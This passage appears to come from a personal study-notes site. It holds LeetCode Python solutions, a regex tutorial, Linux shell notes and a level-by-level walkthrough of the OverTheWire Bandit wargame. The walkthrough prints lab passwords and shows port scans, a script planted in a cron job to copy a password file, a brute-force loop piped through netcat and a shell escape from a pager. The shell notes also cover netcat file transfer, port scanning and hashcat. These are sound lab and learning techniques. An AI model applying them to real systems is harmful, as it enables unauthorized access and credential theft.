...\n</code></pre></p>"},{"location":"leetcode/leetcode/#convert_zigzag","title":"convert (zigzag)","text":""},{"location":"leetcode/leetcode/#compressed_matrix","title":"compressed matrix","text":"<p><pre><code>class Solution(object):\n    def convert(self, s, numRows):\n        \"\"\"\n        :type s: str\n        :type numRows: int\n        :rtype: str\n        \"\"\"\n        if numRows == 1:\n            return s\n\n        lists = [[] for _ in range(numRows)]\n\n        row = 0     # \u4e00\u7ec4\u662f2*numRow-2, 0~numRow-1 \u5f80\u4e0b\uff0cnumRow-1~2*numRow-2 \u5f80\u4e0a\n        for char in s:\n            if row &lt; numRows:\n                lists[row].append(char)\n            else:\n                lists[2 * numRows - row - 2].append(char)\n\n            row = (row + 1) % (2 * numRows - 2)\n\n        res = []\n        for row in lists:\n            for elem in row:\n                res.append(elem)\n        return \"\".join(res)\n</code></pre> black box! API! \u53ea\u9700\u8981\u8fd4\u56de\u6309\u884c\u8f93\u51fa\u7684\u7ed3\u679c \u4e2d\u95f4\u8fc7\u7a0b\u4e0d\u9700\u8981\u771f\u7684\u5b58\u50a8 <pre><code>P   A   H   N\nA P L S I I G\nY   I   R\n</code></pre></p>"},{"location":"leetcode/leetcode/#direct_construction","title":"direct construction","text":"<pre><code>class Solution:\n    def convert(self, s: str, numRows: int) -&gt; str:\n        n, r = len(s), numRows\n        if r == 1 or r &gt;= n:\n            return s\n        t = r * 2 - 2\n        ans = []\n        for i in range(r):  # \u679a\u4e3e\u77e9\u9635\u7684\u884c\n            for j in range(0, n - i, t):  # \u679a\u4e3e\u6bcf\u4e2a\u5468\u671f\u7684\u8d77\u59cb\u4e0b\u6807\n                ans.append(s[j + i])  # \u5f53\u524d\u5468\u671f\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\n                if 0 &lt; i &lt; r - 1 and j + t - i &lt; n:\n                    ans.append(s[j + t - i])  # \u5f53\u524d\u5468\u671f\u7684\u7b2c\u4e8c\u4e2a\u5b57\u7b26\n        return ''.join(ans)\n</code></pre>"},{"location":"leetcode/leetcode/#ispalindrome","title":"isPalindrome","text":"<pre><code>class Solution(object):\n    def isPalindrome(self, x):\n        \"\"\"\n        :type x: int\n        :rtype: bool\n        \"\"\"\n        if x &lt; 0:\n            return False\n        if x % 10 == 0 and x != 0:\n            return False\n        rev = 0\n        while x &gt; rev:\n            x, rev = x // 10, rev * 10 + x % 10\n\n        return x == rev or x == rev // 10\n</code></pre>"},{"location":"leetcode/leetcode/#longestconsecutive","title":"longestConsecutive","text":"<p><code>set</code>, <code>map</code> are implemented as hash tables time complexity for searching and inserting are \\(O(1)\\) <pre><code>class Solution(object):\n    def longestConsecutive(self, nums):\n        \"\"\"\n        :type nums: List[int]\n        :rtype: int\n        \"\"\"\n        num_set = set(nums)\n        max_len = 0\n        for num in num_set:\n            if num - 1 not in num_set:\n                length = 1 \n                target = num + 1\n                while target in num_set:\n                    length, target = length + 1, target + 1\n                max_len = max(max_len, length)\n        return max_len\n</code></pre></p>"},{"location":"leetcode/leetcode/#movezeros","title":"moveZeros","text":"<p>\u627e\u5230 0 \uff0c\u5220\u6389\uff0c\u672b\u5c3e\u52a0\u4e00\u4e2a 0 \u00d7 <pre><code>if nums[i] == 0:\nnums.pop(i)\nnums.append(0)\n</code></pre> \u4fee\u6539\u6b63\u5728\u904d\u5386\u7684\u6570\u7ec4\u5f88\u5371\u9669 \u2192 \u627e\u5230\u6240\u6709 0 \u7684\u4f4d\u7f6e\u540e\u5220\u9664 <pre><code>nums.pop(zeros[zero - i])\n</code></pre> bad space complexity </p> <p>\u79fb\u52a8\u7a97\u53e3\u548c\u53cc\u6307\u9488\uff1a \u4ea4\u6362 0 block \u7684\u7b2c\u4e00\u4e2a 0 \u548c 0 block \u4e4b\u540e\u7684\u7b2c\u4e00\u4e2a\u975e 0 \u6570 time complexity of swap: \\(O(1)\\)\uff0c\u4e0d\u4f1a\u5f71\u54cd\u603b\u4f53\u65f6\u95f4\u590d\u6742\u5ea6</p> <pre><code>class Solution(object):\n    def moveZeroes(self, nums):\n        \"\"\"\n        :type nums: List[int]\n        :rtype: None Do not return anything, modify nums in-place instead.\n        \"\"\"\n        left = right = 0\n        while right &lt; len(nums):\n            if nums[right] == 0 and nums[left] != 0:\n                left = right\n            if nums[right] != 0:\n                nums[left], nums[right] = nums[right], nums[left]\n                left += 1\n            right += 1\n</code></pre>"},{"location":"leetcode/leetcode/#maxarea","title":"maxArea","text":"<p>Try to use two-pointers. Set one pointer to the left and one to the right of the array. Always move the pointer that points to the lower line.</p> <p>\u5229\u7528\u4e00\u4e9b\u6027\u8d28\u7b5b\u9009\u51fa\u6240\u6709\u53ef\u80fd (\\(O(N^2)\\)) \u4e2d\u7684\u4e00\u90e8\u5206 <pre><code>class Solution(object):\n    def maxArea(self, height):\n        \"\"\"\n        :type height: List[int]\n        :rtype: int\n        \"\"\"\n        left = 0\n        right = len(height) - 1\n        max_water = 0\n        while left &lt; right:\n            water = (right - left) * min(height[left], height[right])\n            if water &gt; max_water:\n                max_water = water\n            if height[left] &lt; height[right]:\n                left = left + 1\n            else:\n                right = right - 1\n        return max_water\n</code></pre></p>"},{"location":"linux/bandit/","title":"Bandit","text":""},{"location":"linux/bandit/#level0","title":"level0","text":"<p><pre><code>cat readme\n</code></pre> ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If</p>"},{"location":"linux/bandit/#level1","title":"level1","text":"<p>weird file name <pre><code>cat ~/-\n</code></pre> 263JGJPfgU6LtdEvgfWU1XP5yac29mFx</p>"},{"location":"linux/bandit/#level2","title":"level2","text":"<p>space in file name <pre><code>cat ~/--spaces\\ in\\ this\\ filename--\n</code></pre> MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx</p>"},{"location":"linux/bandit/#level3","title":"level3","text":"<p>dot in file name  <pre><code>cd inhere\nls -a \ncat ./...Hiding-From-You\n</code></pre> 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ</p>"},{"location":"linux/bandit/#level4","title":"level4","text":"<p>file information <pre><code>file ./*\ncat ./-file07\n</code></pre> 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw</p>"},{"location":"linux/bandit/#level5","title":"level5","text":"<p>file filter <pre><code>cd inhere\nfind . -type f -size 1033c\ncat maybehere07/.file2\n</code></pre> HWasnPhtq9AVKe0dmk45nxy20cvUa6EG</p>"},{"location":"linux/bandit/#level6","title":"level6","text":"<p>file filter <pre><code>find / -type f -size 33c -user bandit7 -group bandit6 | grep password\ncat /var/lib/dpkg/info/bandit7.password\n</code></pre> morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj</p>"},{"location":"linux/bandit/#level7","title":"level7","text":"<p><pre><code>cat data.txt | grep millionth\n</code></pre> dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc</p>"},{"location":"linux/bandit/#level8","title":"level8","text":"<p><pre><code>sort data.txt | uniq -u\n</code></pre> 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM</p>"},{"location":"linux/bandit/#lebel9","title":"lebel9","text":"<p><code>strings</code> - print the sequences of printable characters in files <pre><code>strings data.txt\n</code></pre> FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey</p>"},{"location":"linux/bandit/#level10","title":"level10","text":"<p>base64 <pre><code>base64 -d data.txt\n</code></pre> dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr</p>"},{"location":"linux/bandit/#level11","title":"level11","text":"<p>Rot13 <code>tr</code>: translate or delete characters</p> <p><pre><code>cat data.txt | tr \"a-zA-Z\" \"n-za-mN-ZA-M\"\n</code></pre> 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4</p>"},{"location":"linux/bandit/#level12","title":"level12","text":"<ul> <li> <p>hexdump <code>xxd</code>: make a hex dump or do the reverse</p> </li> <li> <p>file compression</p> </li> <li><code>gzip</code> </li> <li><code>bzip2</code></li> <li><code>tar</code></li> <li>... <pre><code>xxd -r data.txt\nfile data.txt   # gzip\nmv data.txt data.gz\ngzip -d data.gz\nfile data.out   # bzip2\nmv data.out data.bz2\nbzip2 -d data.bz2\nfile data   # POSIX tar archive (GNU)\nmv data data.tar\ntar -xf data.tar \n...\n</code></pre> FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn</li> </ul>"},{"location":"linux/bandit/#level13","title":"level13","text":"<p><code>ssh -i</code>: identity_file Selects a file from which the identity (private key) for public key authentication is read. <pre><code>ssh -i ./sshkey.private bandit14@localhost -p 2220\ncat /etc/bandit_pass/bandit14\n</code></pre> MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS</p>"},{"location":"linux/bandit/#level14","title":"level14","text":"<p><code>nc</code>: arbitrary TCP and UDP connections and listens <pre><code>nc localhost 30000\n</code></pre> 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo</p>"},{"location":"linux/bandit/#level15","title":"level15","text":"<p><code>openssl</code>: OpenSSL command line program</p> <p>OpenSSL is a cryptography toolkit implementing the Secure Sockets Layer (SSL v2/v3) and Transport Layer Security (TLS v1) network protocols and related cryptography standards required by them. The openssl program is a command line program for using the various cryptography functions of OpenSSL's crypto library from the shell.  It can be used for</p> <p>o  Creation and management of private keys, public keys and parameters o  Public key cryptographic operations o  Creation of X.509 certificates, CSRs and CRLs o  Calculation of Message Digests and Message Authentication Codes o  Encryption and Decryption with Ciphers o  SSL/TLS Client and Server Tests o  Handling of S/MIME signed or encrypted mail o  Timestamp requests, generation and verification</p> <p><pre><code>openssl s_client -connect localhost:30001\n</code></pre> kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx</p>"},{"location":"linux/bandit/#level16","title":"level16","text":"<p><code>nmap</code>: Network exploration tool and security / port scanner <code>ncat</code>: Concatenate and redirect sockets <pre><code>nmap -sV localhost -p 31000-32000\n# several open ports, 2 ssl \nncat --ssl localhost 31790\n# submit password -&gt; private key in /tmp/key/private.key\nssh -i /tmp/key/private.key bandit17@localhost -p 2220\n</code></pre></p>"},{"location":"linux/bandit/#level17","title":"level17","text":"<p><code>diff</code>: compare files line by line <pre><code>diff passwords.new passwords.old\n</code></pre> x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO</p>"},{"location":"linux/bandit/#level18","title":"level18","text":"<p>executing commands remotely <pre><code>ssh bandit18@bandit.labs.overthewire.org -p 2220 \"cat ./readme\"\n</code></pre> cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8</p>"},{"location":"linux/bandit/#level19","title":"level19","text":"<p>setuid: set user ID <pre><code>./bandit20-do cat /etc/bandit_pass/bandit20\n</code></pre> 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO</p>"},{"location":"linux/bandit/#level20","title":"level20","text":"<p><code>nc -l</code>: Listen for an incoming connection <pre><code>echo \"0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\" | nc -l 1234 &amp;\n# echo: send to pipe immediately, but not send to the port until connected\n# listen on local port 1234\n./suconnect 1234\n# connect local port 1234 \n</code></pre> EeoULMCra2q0dSkYj561DX7s1CpBuOBt</p>"},{"location":"linux/bandit/#level21","title":"level21","text":"<p><code>cron</code>: daemon to execute scheduled commands</p> <p><pre><code>ls /etc/cron.d\ncat cronjob_bandit22\ncat ...\n</code></pre> tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q</p>"},{"location":"linux/bandit/#level22","title":"level22","text":"<p><pre><code>cat cronjob_bandit23\n# #!/bin/bash\n\n# myname=$(whoami)\n# mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\n\n# echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"\n\n# cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget\necho I am uer bandit23 | md5sum | sut -d ' ' -f 1\n# 8ca319486bfbbc3663ea0fbe81326349\ncat /tmp/8ca319486bfbbc3663ea0fbe81326349\n</code></pre> 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga</p>"},{"location":"linux/bandit/#level23","title":"level23","text":"<p><pre><code>$ cat cronjob_bandit24\n$ cat /usr/bin/cronjob_bandit24.sh\n</code></pre> <pre><code>#!/bin/bash\n\nmyname=$(whoami)\n\ncd /var/spool/$myname/foo\necho \"Executing and deleting all scripts in /var/spool/$myname/foo:\"\nfor i in * .*;\ndo\n    if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];\n    then\n        echo \"Handling $i\"\n        owner=\"$(stat --format \"%U\" ./$i)\"\n        if [ \"${owner}\" = \"bandit23\" ]; then\n            timeout -s 9 60 ./$i\n        fi\n        rm -f ./$i\n    fi\ndone\n</code></pre> <pre><code>$ vim /tmp/getpassword.sh\n</code></pre> <pre><code>#!/bin/bash \n\ncat /etc/bandit_pass/bandit24 &gt; /tmp/pw.txt\n</code></pre> <pre><code>$ chmod +x  /tmp/getpassword.sh\n$ cp /tmp/getpassword.sh /var/spool/bandit24/foo\n$ cat /tmp/pw.txt\n</code></pre> gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8</p>"},{"location":"linux/bandit/#level24","title":"level24","text":"<p>boom <pre><code>#!/bin/bash\n\nfor i in {0000..9999}\ndo\n        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i &gt;&gt; possibilities.txt\ndone\n\ncat possibilities.txt | nc localhost 30002 &gt; result.txt\n</code></pre> <pre><code>$ cat result.txt | grep -v Wrong    # -v: invert matching \n</code></pre> iCi86ttT4KSNe1armKiwbQNmB3YJP3q4</p>"},{"location":"linux/bandit/#level25","title":"level25","text":"<p><code>/etc/passwd</code>: stores the basic information of all users <pre><code>$ cat /etc/passwd | grep bandit26   # check shell\nbandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext\n# user name:password:uid:gid:comment:home directory:shell\n$ cat /usr/bin/showtext\n#!/bin/sh\n\nexport TERM=linux\n\nmore ~/text.txt # we should stop here\nexit 0  # !!!\n$\n</code></pre> <code>more</code>:  file perusal filter for crt viewing hidden feature: type <code>v</code> will call the defualt editor </p> <p><pre><code># first shrink the terminal interface\n$ ssh -i ./bandit26.sshkey bandit26@localhost -p 2220\n# page viewing, type v\n:set shell=/bin/bash    # command mode\n:shell  # call shell (bash)\ncat /etc/bandit_pass/bandit26\n</code></pre> s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ</p>"},{"location":"linux/bandit/#level26","title":"level26","text":"<p><pre><code>./bandit27-do cat /etc/bandit_pass/bandit27\n</code></pre> upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB</p>"},{"location":"linux/bandit/#level27","title":"level27","text":"<p><pre><code>git clone ssh://bandit27-git@localhost/home/bandit27-git/repo\n</code></pre> Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN</p>"},{"location":"linux/bandit/#level28","title":"level28","text":"<p>version <pre><code>mkdir /tmp/git-bandit28\ncd /tmp/git-bandit28\ngit clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo # add port!\ncat README.md\n# password: xxxxx\ngit log\n# versions shown\ngit checkout 68314e012fbaa192abfc9b78ac369c82b75fab8f\ncat README.md\n</code></pre> 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7</p>"},{"location":"linux/bandit/#level29","title":"level29","text":"<p>branch <pre><code>git branch -a\ngit checkout dev\ncat README.md\n</code></pre> qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL</p>"},{"location":"linux/bandit/#level30","title":"level30","text":"<p>tag <pre><code>git tag\ngit show secret\n</code></pre> fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy</p>"},{"location":"linux/bandit/#level31","title":"level31","text":"<p>add -&gt; commit -&gt; push <pre><code>echo \"May I come in?\" &gt; key.txt\ngit add -f key.txt\ngit commit -m \"key\"\ngit push origin master\n</code></pre> 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K</p>"},{"location":"linux/bandit/#level32","title":"level32","text":"<p><code>$0</code> - Name of the script <pre><code># UPPER SHELL\n$0\ncat /etc/bandit_pass/bandit33\n</code></pre> tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0</p>"},{"location":"linux/regular%20expression/","title":"Regular Expression","text":""},{"location":"linux/regular%20expression/#regular_expression","title":"Regular Expression","text":"<p>debugger https://regex101.com/r/qqbZqh/2</p> <p>toturial https://regexone.com/problem/matching_html</p> <p>Regular expressions are extremely useful in extracting information from text such as code, log files, spreadsheets, or even documents. </p>"},{"location":"linux/regular%20expression/#metacharacters","title":"Metacharacters","text":"<p><code>abc\u2026</code>  Letters <code>123\u2026</code>  Digits</p> <p><code>\\d</code>    Any Digit <code>\\D</code>    Any Non-digit character</p> <p><code>.</code> Any Character \u2192 (escape) <code>\\.</code> Period</p> <p><code>[abc]</code> Only a, b, or c <code>[^abc]</code>    Not a, b, nor c <code>[a-z]</code> Characters a to z <code>[0-9]</code> Numbers 0 to 9 <code>[^n-p]</code>  character except for letters n to p</p> <p><code>\\w</code>    Any Alphanumeric character equivalent to the character range [A-Za-z0-9_]</p> <p><code>\\W</code>    Any Non-alphanumeric character</p> <p><code>\\b</code> the boundary between a word and a non-word character.  - It's most useful in capturing entire words (for example by using the pattern \\w+\\b)</p> <p><code>{m}</code>   m Repetitions <code>{m,n}</code> m to n Repetitions - a{3} - [^1-9]{2,6} - .{1,3}</p> <p><code>*</code> Zero or more repetitions <code>+</code> One or more repetitions - .* - aa+bc+ - (,\\d+)</p> <p><code>*</code> and <code>+</code> are, by default, \"greedy\". They will match as much text as they can.  - ^.*: ab:cde:f</p> <p><code>?</code> Optional character \u2192 (escape) <code>\\?</code> Question mark -  ab?c : match either the strings \"abc\" or \"ac\" because the b is considered optional</p> <p><code>\\s</code>    Any Whitespace</p> <p>The most common forms of whitespace you will use with regular expressions are the space (<code>\u2423</code>), the tab (<code>\\t</code>), the new line (<code>\\n</code>) and the carriage return (<code>\\r</code>) (useful in Windows environments), and these special characters match each of their respective whitespaces. In addition, a whitespace special character <code>\\s</code> will match any of the specific whitespaces above and is extremely useful when dealing with raw input text. <code>\\S</code>    Any Non-whitespace character</p> <p>It is often best practice to write as specific regular expressions as possible to ensure that we don't get false positives when matching against real world text. e.g. We wanted to match the word \"success\" in a log file. We certainly don't want that pattern to match a line that says \"Error: unsuccessful operation\"! <code>^\u2026$</code>   Starts and ends - ^succuss</p> <p>Note that this is different than the hat used inside a set of bracket [^...] for excluding characters</p> <p>Regular expressions allow us to not just match text but also to extract information for further processing.  <code>(\u2026)</code>   Capture Group - ^(IMG\\d+.png)$ captures and extracts the full filename - ^(IMG\\d+).png$ captures the part before the period.</p> <p><code>(a(bc))</code>   Capture Sub-group - ^(IMG(\\d+)).png$</p> <p>Generally, the results of the captured groups are in the order in which they are defined (in order by open parenthesis).</p> <p><code>(.*)</code>  Capture all</p> <p>Specifically when using groups, you can use the <code>|</code> (logical OR, aka. the pipe) to denote different possible sets of characters. <code>(abc|def)</code> Matches abc or def</p> <p>back referencing Many systems allow you to reference your captured groups by using \\0 (usually the full matched text), \\1 (group 1), \\2 (group 2), etc.</p>"},{"location":"linux/regular%20expression/#examples","title":"Examples","text":"<p>Matching decimal numbers</p> <p>3.14529 -255.34  128  1.9e10 123,340.00 <pre><code>^-?\\d+(,\\d+)*(\\.\\d+(e\\d+)?)?$\n</code></pre> Matching phone numbers</p> <p>Task    Text    Capture Groups  capture 415-555-1234    415 capture 650-555-2345    650 capture (416)555-3456   416  capture 202 555 4567    202 capture 4035555678  403 capture 1 416 555 9292  416 <pre><code>1?[\\s-]?\\(?(\\d{3})\\)?[\\s-]?\\d{3}[\\s-]?\\d{4}\n</code></pre></p> <p>Matching emails</p> <p>Task    Text    Capture Groups  capture tom@hogwarts.com    tom capture tom.riddle@hogwarts.com tom.riddle  capture tom.riddle+regexone@hogwarts.com    tom.riddle  capture tom@hogwarts.eu.com tom capture potter@hogwarts.com potter  capture harry@hogwarts.com  harry   capture hermione+regexone@hogwarts.com  hermione</p> <p><pre><code>^([\\w\\.]*)\n</code></pre> It will match up to the point in the text where it reaches an '@' or '+'.</p>"},{"location":"linux/shell/","title":"shell","text":""},{"location":"linux/shell/#cli","title":"CLI","text":""},{"location":"linux/shell/#terminal","title":"Terminal","text":"<p>\"end point of a railway line,\" 1888, from terminal (adj.);  sense of \"device for communicating with a computer\" is first recorded 1954.  Earlier \"final part of a word\" (1831).</p>"},{"location":"linux/shell/#the_shell","title":"the Shell","text":"<p>Computers these days have a variety of interfaces for giving them commands; fanciful graphical user interfaces, voice interfaces, and even AR/VR are everywhere. These are great for 80% of use-cases, but they are often fundamentally restricted in what they allow you to do.  To take full advantage of the tools your computer provides, we have to go old-school and drop down to a textual interface: The Shell.</p>"},{"location":"linux/shell/#environment_variable","title":"Environment Variable","text":""},{"location":"linux/shell/#shell_command","title":"Shell Command","text":""},{"location":"linux/shell/#permission_management","title":"Permission Management","text":"<p>Permission Types - read \u00ae - write (w) - execute (or  search  for directories)  (x) - execute/search only if the file is a directory or already has execute permission for some user (X) - set user or group ID on execution (s)   - \u200b\u200bSet User ID (SUID - sor 4):\u200b\u200b When set on an executable, it runs with the permissions of the file's owner, not the user who executed it. (e.g., /usr/bin/passwd).   - \u200bSet Group ID (SGID - sor 2):\u200b\u200b   On an executable: runs with the group's permissions.   On a directory: new files created inside inherit the directory's group.</p> <p>Viewing Permissions</p> <p><code>ls -l</code> <pre><code>$ ls -l important_document.txt\n-rwxr-xr-- 1 alice developers 2048 Sep 12 10:00 important_document.txt\n</code></pre> - 1<sup>st</sup> character (-):\u200b\u200b File type (-= regular file, d= directory, l= symbolic link). - \u200b2-4 chars (rwx):\u200b\u200b Permissions for the \u200b\u200buser (owner)\u200b\u200b. - \u200b5-7 chars (r-x):\u200b\u200b Permissions for the \u200b\u200bgroup\u200b\u200b. - 8-10 chars (r--):\u200b\u200b Permissions for \u200b\u200bothers\u200b\u200b.</p> <p>Changing Permissions</p> <p><code>chmod</code> - change file mode bits</p> <p>symbolic representation: [ugoa...][[-+=][perms...]...]</p> <p><code>ugoa</code> controls which users' access to the file will be changed   - <code>u</code>: user / owner   - <code>g</code>: group   - <code>o</code>: others   - <code>a</code>: all (default)</p> <p><code>perms</code> is either zero or more letters from the set <code>rwxXst</code>, or a single letter from the set <code>ugo</code>.</p> <ul> <li>restricted deletion flag or sticky bit --  Applied to a directory, it restricts file deletion. Only the file owner, directory owner, or root can delete files within it (e.g., /tmp). (t)</li> </ul> <p>octal number representation derived by adding up the bits with values 4 (read), 2 (write), and 1 (execute) - The first digit selects the set user ID (4) and set group ID (2) and restricted deletion or sticky (1) attributes. - The second: owner - The third: group - The fourth: other users </p> <p><code>chown</code> - change file owner and group <pre><code>chown [OPTION]... [OWNER][:[GROUP]] FILE...\n</code></pre> If a colon but  no  group name follows the user name, that user is made the owner of the files and the group of the files is changed to that user's login group.</p> <p><code>chgrp</code> - change group ownership <pre><code>chgrp [OPTION]... GROUP FILE...\n</code></pre> Change the group of each FILE to GROUP. <pre><code>chgrp [OPTION]... --reference=RFILE FILE...\n</code></pre> Change the group of each FILE to that of RFILE.</p>"},{"location":"linux/shell/#data_wrangling","title":"Data Wrangling","text":"<p><code>sed</code> - stream editor for filtering and transforming text <pre><code>sed [OPTION]... {script-only-if-no-other-script} [input-file]...\n</code></pre> -E, -r, --regexp-extended use extended regular expressions in the script (for portability use POSIX -E).</p> <p>Substitute (Replace) Text (s/)\u200b <pre><code>sed 's/old/new/' file.txt   #Replace the \u200b\u200bfirst occurrence\u200b\u200b of a pattern per line\nsed 's/old/new/g' file.txt  # Replace all occurrences\u200b\u200b (global)\nsed 's/hello/HELLO/i' file.txt  # \u200b\u200bCase-insensitive replacement\u200b\n</code></pre> Delete Lines (/d)\u200b <pre><code>sed '/pattern/d' file.txt\n</code></pre></p> <p><code>awk</code> is a programming language that just happens to be really good at processing text streams.  <pre><code>awk '{print $2}'\nawk '$1 == 1 &amp;&amp; $2 ~ /^c[^ ]*e$/ { print $2 }'\n</code></pre></p> <p><code>paste</code> - merge lines of files <pre><code>paste [OPTION]... [FILE]...\n</code></pre> -d, --delimiters=LIST reuse characters from LIST instead of TABs (by default)</p> <p>-s, --serial paste one file at a time instead of in parallel</p> <p>-z, --zero-terminated line delimiter is NUL, not newline</p> <p><code>wc</code> - print newline, word, and byte counts for each file</p> <p>-c, --bytes print the byte counts</p> <p>-m, --chars print the character counts</p> <p>-l, --lines print the newline counts</p> <p><code>sort</code> - sort lines of text files <pre><code>sort [OPTION]... [FILE]...\n</code></pre> -r, --reverse reverse the result of comparisons</p> <p><code>uniq</code> - report or omit repeated lines</p> <pre><code>uniq [OPTION]... [INPUT [OUTPUT]]\n</code></pre> <p>-i, --ignore-case ignore differences in case when comparing</p> <p>-s, --skip-chars=N avoid comparing the first N characters</p> <p>-w, --check-chars=N compare no more than N characters in lines</p> <p>-c, --count prefix lines by the number of occurrences</p> <p>-d, --repeated only print duplicate lines, one for each group</p> <p>-u, --unique only print unique lines</p> <p><code>nc</code> \u2014 arbitrary TCP and UDP connections and listens The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets.</p> <p>CLIENT/SERVER MODEL On one console, start nc listening on a specific port for a connection. <pre><code>$ nc -l 1234\n</code></pre> On a second console (or a second machine), connect to the machine and port being listened on: <pre><code>$ nc -N 127.0.0.1 1234  # -N: shutdown(2) the network socket after EOF on the input.\n</code></pre> There should now be a connection between the ports.  Anything typed at the second console will be concatenated to the first, and vice-versa. After the connection has been set up, nc does not really care which side is being used as a \u2018server\u2019 and which side is being used as a \u2018client\u2019. </p> <p>DATA TRANSFER</p> <p>Start by using nc to listen on a specific port, with output captured into a file: <pre><code>$ nc -l 1234 &gt; filename.out\n</code></pre> Using a second machine, connect to the listening nc process, feeding it the file which is to be transferred: <pre><code>$ nc -N host.example.com 1234 &lt; filename.in\n</code></pre> After the file has been transferred, the connection will close automatically.</p> <p>TALKING TO SERVERS</p> <p>For example, to retrieve the home page of a web site: <pre><code>$ printf \"GET / HTTP/1.0\\r\\n\\r\\n\" | nc host.example.com 80\n</code></pre></p> <p>PORT SCANNING</p> <pre><code>$ nc -zv host.example.com 20-30\nConnection to host.example.com 22 port [tcp/ssh] succeeded!\nConnection to host.example.com 25 port [tcp/smtp] succeeded!\n</code></pre> <p><code>nmap</code> (\u201cNetwork Mapper\u201d) - Network exploration tool and security / port scanner <pre><code>nmap [Scan Type...] [Options] {target specification}\n</code></pre></p> <p>TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: <code>scanme.nmap.org</code>, <code>microsoft.com/24</code>, 192.168.0.1; 10.0.0-255.1-254</p> <p>HOST DISCOVERY: -sn: Ping Scan - disable port scan</p> <p>PORT SPECIFICATION AND SCAN ORDER: -p \\&lt;port ranges&gt;: Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</p> <p>SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sN/sF/sX: TCP Null, FIN, and Xmas scans -sU: UDP Scan</p> <p>OS DETECTION: -O: Enable OS detection</p> <p>SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info</p> <p><code>hashcat</code> - Advanced CPU-based password recovery utility</p> <pre><code>hashcat [options] hashfile [mask|wordfiles|directories]\n</code></pre> <p>Hashcat is the world\u2019s fastest CPU-based password recovery tool.</p> <p>As we covered in the lecture find's -exec can be very powerful for performing operations over the files we are searching for. However, what if we want to do something with all the files, like creating a zip file? As you have seen so far commands will take input from both arguments and STDIN. When piping commands, we are connecting STDOUT to STDIN, but some commands like tar take inputs from arguments. To bridge this disconnect there's the xargs command which will execute a command using STDIN as arguments. For example ls | xargs rm will delete the files in the current directory.</p> <p>finds all HTML files in the folder and makes a zip with them <pre><code>find . -type f -name \"*.html\" | xargs -d '\\n' tar -cvzf archive.tar.gz \n</code></pre></p>"},{"location":"linux/shell/#globbing","title":"Globbing","text":"<ul> <li>Wildcards</li> <li><code>*</code>: expand 0 or more characers</li> <li><code>?</code>: expand exactly 1 character</li> <li>Curly braces <code>{}</code></li> </ul> <pre><code>convert image.{png,jpg}\n# Will expand to\nconvert image.png image.jpg\n\ncp /path/to/project/{foo,bar,baz}.sh /newpath\n# Will expand to\ncp /path/to/project/foo.sh /path/to/project/bar.sh /path/to/project/baz.sh /newpath\n\n# Globbing techniques can also be combined\nmv *{.py,.sh} folder\n# Will move all *.py and *.sh files\n\n\nmkdir foo bar\n# This creates files foo/a, foo/b, ... foo/h, bar/a, bar/b, ... bar/h\ntouch {foo,bar}/{a..h}\ntouch foo/x bar/y\n# Show differences between files in foo and bar\ndiff &lt;(ls foo) &lt;(ls bar)\n# Outputs\n# &lt; x\n# ---\n# &gt; y\n</code></pre>"},{"location":"linux/shell/#shell_function","title":"Shell Function","text":"<p>Functions are executed in the current shell environment. Thus, they can modify environment variables.</p> <pre><code>mcd () {\n    mkdir -p \"$1\"\n    cd \"$1\"\n    export VAR=$(pwd)   # export environment variable\n}\n</code></pre>"},{"location":"linux/shell/#script","title":"Script","text":""},{"location":"linux/shell/#shebang","title":"Shebang","text":"<p>The \u200b\u200bshebang\u200b\u200b (#!) is a special sequence at the \u200b\u200bbeginning of a script file\u200b\u200b that tells the system which interpreter (program) should be used to execute the script. <pre><code>#!/bin/bash\n</code></pre> use the <code>env</code> command that will resolve to wherever the command lives in the system, increasing the portability of scripts <pre><code>#!/usr/bin/env python\n</code></pre></p>"},{"location":"linux/shell/#special_characters","title":"Special Characters","text":"<ul> <li><code>$0</code> - Name of the script</li> <li><code>$1</code> to <code>$9</code> - Arguments to the script. <code>$1</code> is the first argument and so on.</li> <li><code>$@</code> - All the arguments</li> <li><code>$#</code> - Number of arguments</li> <li><code>$?</code> - Return code of the previous command</li> <li><code>$$</code> - Process identification number (PID) for the current 